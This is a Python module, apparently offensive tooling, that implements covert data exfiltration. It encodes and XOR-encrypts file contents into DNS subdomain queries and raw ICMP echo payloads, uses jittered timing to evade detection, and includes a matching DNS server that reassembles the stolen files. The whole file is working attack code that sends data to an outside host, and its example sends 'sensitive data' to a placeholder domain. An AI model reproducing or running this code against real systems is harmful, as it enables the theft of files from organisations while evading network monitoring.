#!/usr/bin/env python3
"""DNS Exfiltration Module"""

import socket
import base64
import zlib
import os
import time
import random
import struct
from typing import List, Optional

class DNSExfil:
    """DNS-based data exfiltration using subdomain encoding"""
    
    def __init__(self, domain: str, key: bytes, delay_ms: int = 100):
        self.domain = domain
        self.key = key
        self.delay_ms = delay_ms
        
    def exfil(self, data: bytes, file_id: str) -> bool:
        """Exfiltrate data via DNS queries"""
        compressed = zlib.compress(data, 9)
        encrypted = self._xor_encrypt(compressed)
        encoded = base64.b32encode(encrypted).decode().lower().rstrip("=")
        
        # Split into 60-byte chunks (DNS label limit is 63)
        chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        total = len(chunks)
        
        for i, chunk in enumerate(chunks):
            query = f"{chunk}.{i}-{total}.{file_id}.{self.domain}"
            try:
                socket.gethostbyname(query)
            except:
                pass
            self._jitter_delay()
        return True
    
    def exfil_file(self, filepath: str) -> bool:
        """Exfiltrate entire file"""
        with open(filepath, 'rb') as f:
            data = f.read()
        file_id = os.path.basename(filepath)[:8].replace('.', '_')
        return self.exfil(data, file_id)
    
    def _xor_encrypt(self, data: bytes) -> bytes:
        return bytes(b ^ self.key[i % len(self.key)] for i, b in enumerate(data))
    
    def _jitter_delay(self):
        delay = self.delay_ms / 1000 * random.uniform(0.8, 1.2)
        time.sleep(delay)


class ICMPExfil:
    """ICMP-based data exfiltration using echo request payload"""
    
    def __init__(self, target: str, key: bytes):
        self.target = target
        self.key = key
        
    def exfil(self, data: bytes) -> bool:
        """Exfiltrate data via ICMP"""
        compressed = zlib.compress(data, 9)
        chunks = [compressed[i:i+32] for i in range(0, len(compressed), 32)]
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            return False
        
        for i, chunk in enumerate(chunks):
            packet = self._build_icmp(i, chunk)
            sock.sendto(packet, (self.target, 0))
            time.sleep(0.05)
        
        sock.close()
        return True
    
    def _build_icmp(self, seq: int, payload: bytes) -> bytes:
        """Build ICMP echo request packet"""
        icmp_type = 8  # Echo request
        icmp_code = 0
        checksum = 0
        identifier = os.getpid() & 0xFFFF
        sequence = seq
        
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)
        checksum = self._checksum(header + payload)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)
        
        return header + payload
    
    def _checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff


class DNSTunnelServer:
    """DNS server for receiving exfiltrated data"""
    
    def __init__(self, domain: str, key: bytes, port: int = 53):
        self.domain = domain
        self.key = key
        self.port = port
        self.received_chunks = {}
        
    def start(self):
        """Start listening for DNS queries"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', self.port))
        
        while True:
            data, addr = sock.recvfrom(512)
            self._process_query(data, addr, sock)
    
    def _process_query(self, data: bytes, addr: tuple, sock: socket.socket):
        """Process incoming DNS query and extract data"""
        # Parse DNS query
        qname = self._extract_qname(data)
        if not qname.endswith(self.domain):
            return
        
        # Extract chunk info
        parts = qname.replace('.' + self.domain, '').split('.')
        if len(parts) >= 3:
            chunk_data = parts[0]
            chunk_info = parts[1]  # "idx-total"
            file_id = parts[2]
            
            if file_id not in self.received_chunks:
                self.received_chunks[file_id] = {}
            
            idx, total = map(int, chunk_info.split('-'))
            self.received_chunks[file_id][idx] = chunk_data
            
            # Check if complete
            if len(self.received_chunks[file_id]) == total:
                self._reassemble(file_id, total)
        
        # Send response
        response = self._build_response(data)
        sock.sendto(response, addr)
    
    def _extract_qname(self, data: bytes) -> str:
        """Extract query name from DNS packet"""
        qname = []
        idx = 12
        while data[idx] != 0:
            length = data[idx]
            qname.append(data[idx+1:idx+1+length].decode())
            idx += length + 1
        return '.'.join(qname)
    
    def _build_response(self, query: bytes) -> bytes:
        """Build DNS response with dummy IP"""
        response = bytearray(query)
        response[2] = 0x81  # QR=1, AA=1
        response[3] = 0x80
        return bytes(response)
    
    def _reassemble(self, file_id: str, total: int):
        """Reassemble and decrypt exfiltrated data"""
        chunks = self.received_chunks[file_id]
        encoded = ''.join(chunks[i] for i in range(total))
        
        # Pad base32 if needed
        padding = (8 - len(encoded) % 8) % 8
        encoded += '=' * padding
        
        encrypted = base64.b32decode(encoded.upper())
        compressed = bytes(b ^ self.key[i % len(self.key)] for i, b in enumerate(encrypted))
        data = zlib.decompress(compressed)
        
        # Save to file
        with open(f'exfil_{file_id}.bin', 'wb') as f:
            f.write(data)
        
        del self.received_chunks[file_id]


if __name__ == "__main__":
    # Example usage
    exfil = DNSExfil(
        domain="data.example.com",
        key=b"secretkey123",
        delay_ms=100
    )
    
    test_data = b"Sensitive data to exfiltrate"
    exfil.exfil(test_data, "test001")
